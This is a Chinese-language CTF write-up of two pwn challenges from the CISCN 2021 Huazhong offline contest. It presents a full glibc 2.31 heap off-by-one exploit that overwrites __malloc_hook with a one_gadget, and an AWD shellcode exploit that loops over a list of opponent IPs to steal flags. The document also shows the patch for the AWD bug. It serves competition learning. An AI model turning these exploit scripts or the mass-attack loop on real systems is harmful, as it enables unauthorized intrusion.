# ciscn2021 华中线下赛pwn部分题解

阅读量 **112032**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-07-26 16:30:16

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01a689023ab42c44b4.png)

## 前言

菜鸡第一次打线下赛，一天解题一天awd，一共四个pwn，解题赛的pwn2到最后都只有一个师傅搞定（凌霄的师傅tql），本菜鸡只出了两个题，不过还好现场awd不是很激烈，只靠一个也勉强活了下来。本文简单记录一下解题的pwn1和awd的水pwn。

![](https://p2.ssl.qhimg.com/t01045ca2caf98e5e53.jpg)

## pwn1

![](https://p5.ssl.qhimg.com/t0147ed322bca5dfe06.png)

解题赛一共两个pwn题，还好队伍里其他大佬c我。

###  漏洞点

pwn1就是一道朴实无华的堆题，2.31的libc，在申请堆块输入内容的时候存在off by one。

    
    
     for ( i = 0; i <= size; ++i )
      {
        read(0, &buf, 1uLL);
        if ( buf == 10 )
          break;
        *(_BYTE *)(a1 + i) = buf;
      }
    

只能申请特定size的堆块 ，0x68和0xe8，并且使用calloc（）申请堆块，并且限制了只能同时控制三个堆块，这一点限制了很多操作。

    
    
    nmemb = 0;
    get_input();
    if ( nmemb_4 == 1 )
      {
        nmemb = 0x68;
      }
      else if ( nmemb_4 == 2 )
      {
        nmemb = 0xE8;
      }
      addr = calloc(nmemb, 1uLL);
    

###  思路

**泄露地址**

审计漏洞点，发现可申请的chunk大小只有0x71,0xf1,0x21。所以可以想到用0xf1的unsorted
bin泄露地址，利用0x71的chunk进行fastbin attack。  
首先将0xf1的tcache打满，因为calloc不会从tcache中取chunk，所以直接循环就可以将tcache打满。

![](https://p2.ssl.qhimg.com/t018473c3fca3c09992.png)

然后再次申请一个0xf1的chunk0，用来释放进入unsorted
bin，同时再申请一个0x71的chunk1，同时在chunk1中伪造一个堆头，用来满足下一步从unsorted
bin中切出chunk后溢出修改size后的检测。

![](https://p3.ssl.qhimg.com/t0102b07315f7e31d51.png)

查看此时内存。

![](https://p4.ssl.qhimg.com/t01a2428de87000d32c.png)

然后从unsorted bin中切出一个0x71大小的chunk0，同时溢出修改剩余unsorted
bin的size为0xb1，这里size可以是任意值，只要可以覆盖相邻的chunk1，并且在chunk1中伪造好堆头。

![](https://p3.ssl.qhimg.com/t01e197018004bf98de.png)

所以现在有一个问题是如何将 `main_arena` 泄露出来，从chunk1的fd到当前 `main_arena` 的偏移为 `0xa20-0x9a0 =
0x80`
，然而正常情况下，我们只能申请0xf1和0x71大小的堆块，但是如果申请的时候给一个非法选项的size，就会calloc（0）得到一个0x21的堆块，所以如果calloc(0)执行四次，就刚好将
`main_arena` 推到了chunk1的fd位置，show(1)即可泄露地址。

![](https://p0.ssl.qhimg.com/t01efd8a8cbabbf837e.png)

**getshell**

成功泄露地址之后，利用0x71的chunk进行fastbin attack。这里主要的困难是只能同时控制三个堆块。  
从上一张图中能看到，chunk1的size被改为了0x31，chunk0是用来修改unsorted bin的size的0x71大小的chunk。  
这部分最难受的就是同时只有三个堆块，被这个卡了很久。  
跟泄露地址差不多的思路，此时堆布局为：

    
    
    chunk0 0xf1
    
    chunk1 0x71
    
    chunk2 0xf1
    

将chunk0和chunk1释放，分别进入unsorted
bin和fastbin，然后将fastbin中的chunk申请回来，同时将chunk2的presize改为0xf0，size改为0xf0。

![](https://p5.ssl.qhimg.com/t015b73ad54a68ce74f.png)

然后在unsorted bin中申请0x71的chunk，同时溢出一字节修改size为0xf1。

![](https://p2.ssl.qhimg.com/t018b5ec33ec869063a.png)

就可以将overlap的chunk释放到fastbin中。然后通过申请0xf1的chunk时写入，覆盖fastbin的fd指针为
`malloc_hook-0x33` ，当前内存布局如下。

![](https://p0.ssl.qhimg.com/t019b4f345edd135d44.png)

查看fastbin。

![](https://p0.ssl.qhimg.com/t018eb07b24541d41b9.png)

这个时候的主要问题就是三个指针都用掉了，要清出两个指针进行fastbin attack，并且释放不能进入0x71的fastbin。

![](https://p1.ssl.qhimg.com/t01b0476558b0f407cb.png)

然后就是将malloc_hook盖为one_gadget。

![](https://p3.ssl.qhimg.com/t01b5cc96c32fd36478.png)

使用第一个one_gaget，调试发现，执行到one_gadget时，r15 = 0 , r12 = size。

![](https://p4.ssl.qhimg.com/t016dfc17adec03f5c4.png)

所以，calloc(0)即满足条件。

![](https://p3.ssl.qhimg.com/t01ce1b6295134fb4f8.png)

###  exp

    
    
    from pwn import *
    from LibcSearcher import *
    context.log_level = 'debug'
    sa = lambda s,n : sh.sendafter(s,n)
    sla = lambda s,n : sh.sendlineafter(s,n)
    sl = lambda s : sh.sendline(s)
    sd = lambda s : sh.send(s)
    rc = lambda n : sh.recv(n)
    ru = lambda s : sh.recvuntil(s)
    ti = lambda : sh.interactive()
    
    def dbg(addr):
        sh.attach(sh,'b *0x{}\nc\n'.format(addr))
    
    def add(ch,c='a'):
        sla('choice:','1')
        sla('Large.',str(ch))
        sla('Content:',c)
    def delete(idx):
        sla('choice:','2')
        sla('Index:',str(idx))
    def show(idx):
        sla('choice:','3')
        sla('Index:',str(idx))
    # add size 1->0x68 2->0xe8 else 0x21
    sh = process('./note')
    #sh = remote('10.12.153.11',58011)
    libc = ELF('/opt/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so')
    
    for i in range(7):#calloc(0xe8) fill tcache
        add(2)
        delete(0)
    
    add(2,'\x00'*0x80)#0
    add(1,'a'*0x20+p64(0xb0)+p64(0x70-0x30))#1  fake pre_sz & sz
    delete(0)#ustbin
    
    add(1,'\x00'*0x68+p64(0xb1))#0 off by one
    
    for i in range(4):
        add(0)
        delete(2)
    
    show(1)
    libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00'))-(0x7efc8cb1dbe0-0x7efc8c932000)
    print hex(libc_base)
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    
    delete(0)
    for i in range(6):
        add(1)
        delete(0)
    add(2)#0
    
    delete(1)#0x30 tcache
    
    add(1,'a'*0x60+p64(0xf0))#1
    
    add(2)#2
    
    delete(0)#unsorted bin
    delete(1)# 0x71 fastbin
    
    add(1,'a'*0x60+p64(0xf0)+p64(0xf0))#0 fake size
    add(1,'\x00'*0x68+p64(0xf1))#1
    delete(0)
    add(2,'\x00'*0x70+p64(0)+p64(0x70)+p64(malloc_hook-0x33)+'\x00'*(0xe8-0x88)+p64(0X51))#0
    delete(2)
    delete(1)
    add(1,'a'*0x68+p64(0x81))
    delete(0)
    add(1)
    add(1,'a'*0x23+p64(libc_base+0xe6c7e))
    delete(0)
    sla('choice:','1')
    #gdb.attach(sh)
    sla('Large.',str(3))
    
    ti()
    

## pwn1_awd

比较简单的一题，不过awd阶段靠这题还拿了不少分，挺离谱的。

###  漏洞点

有一丢丢逆向pwn的意思，不过逻辑很简洁。  
输入格式

    
    
    op : choice 选操作
    
    + ：off 输入偏移
    
    n : size 输入长度
    

操作2和3都是先调用mmap开辟一块内存空间，然后以off为偏移，size为大小写入内容。  
具有可执行权限。

    
    
    unsigned __int64 sub_400A65()
    {
      unsigned int v0; // eax
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
    
      v2 = __readfsqword(0x28u);
      if ( !mmap_addr )
      {
        v0 = getpagesize();
        mmap_addr = (int)mmap((void *)0x1000, v0, 7, 34, 0, 0LL);
      }
      return __readfsqword(0x28u) ^ v2;
    }
    

选项1判断开辟的内存空间内容是否为`0xdeadbeef`，是则getshell。  
但是当时就很奇怪，这个shell读不了根目录下的flag文件，可能跟权限有关系。

    
    
    unsigned __int64 sub_400AD4()
    {
      unsigned __int64 v1; // [rsp+8h] [rbp-8h]
    
      v1 = __readfsqword(0x28u);
      puts("ready?");
      mmap_to_write();
      if ( *(_DWORD *)mmap_addr == 0xDEADBEEF )
        system("/bin/sh");
      puts("oh?");
      return __readfsqword(0x28u) ^ v1;
    }
    

选项4就很直白。

    
    
    unsigned __int64 sub_400C92()
    {
      unsigned __int64 v1; // [rsp+8h] [rbp-8h]
    
      v1 = __readfsqword(0x28u);
      mmap_to_write();
      puts("ready?");
      mmap_addr("ready?")//执行shellcode
      return __readfsqword(0x28u) ^ v1;
    }
    

###  修复

一个是mmap出的内存空间不可执行。 再将后门patch掉，不过后门不修应该也没关系，反正读不到flag。

    
    
    mmap_addr = (__int64 (__fastcall *)(_QWORD))(int)mmap((void *)0x1000, v0, 6, 34, 0, 0LL);
    

###  exp

    
    
    from pwn import *
    from LibcSearcher import *
    context.log_level = 'debug'
    sa = lambda s,n : sh.sendafter(s,n)
    sla = lambda s,n : sh.sendlineafter(s,n)
    sl = lambda s : sh.sendline(s)
    sd = lambda s : sh.send(s)
    rc = lambda n : sh.recv(n)
    ru = lambda s : sh.recvuntil(s)
    ti = lambda : sh.interactive()
    context.arch = 'amd64'
    
    
    shellcode = shellcraft.open('flag.txt')
    shellcode += shellcraft.read('rax','rsp',0x60)
    shellcode += shellcraft.write(1,'rsp',0x60)
    payload = asm(shellcode)
    #sh = remote('10.12.153.18',9999)
    def write_shell():
        return 'op:2\n+:0\nn:400\n\n'
    def run():
        return 'op:4\n\n'
    #gdb.attach(sh)
    def pwn():
        sla('code> ',write_shell())
        sa('ready?',payload)
        sla('code> ',run())
    
    
    #run_shell(sh,'./backdoor')
    
    with open('ip.txt','r') as f:
        ips = f.readlines()
    print ips
    
    f = open('flag_2.txt','w+')
    for i in ips:
        ip= i.strip('\r\n')
        print ip
        sh = remote(ip,9999)
    
        try:
            pwn()
            flag = ru('}')[-38:]
            f.write(flag+'\n')
            print '__flag__:'+flag
        except:
            print 'error'
    f.close()
    

## 总结

解题赛被pwn2支配了大半天，结果还是没什么进展，😔太菜了。听说现场的唯一解是ha1vk，大佬tql。awd就把pwn2洞修了然后也没再看，被web佬c了。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **C4oy1** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/245713](/post/id/245713)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)

 **+1** __5赞

 __收藏

![](https://p0.ssl.qhimg.com/t010fc4391fc78be88c.png) C4oy1

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

